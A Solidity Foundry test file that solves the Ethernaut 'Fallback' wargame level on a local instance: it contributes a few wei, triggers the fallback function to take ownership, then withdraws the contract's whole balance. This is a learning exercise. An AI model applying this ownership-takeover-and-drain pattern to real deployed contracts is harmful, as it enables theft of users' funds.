pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";
import "forge-std/Vm.sol";

contract FallbackAttackTest is DSTest {
    Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // We want to set our selfs as the owner of the contract
        // So first we contribute
        ethernautFallback.contribute{value: 420 wei}();

        // Now we can call the fallback method by sending some ether
        payable(address(ethernautFallback)).call{value: 69 wei}("");

        //Finally withdraw all balance from contract as new owner
        emit log_named_uint(
            "Fallback contract balance before withdrawal",
            address(ethernautFallback).balance
        );
        ethernautFallback.withdraw();
        emit log_named_uint(
            "Fallback contract balance after withdrawal",
            address(ethernautFallback).balance
        );

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
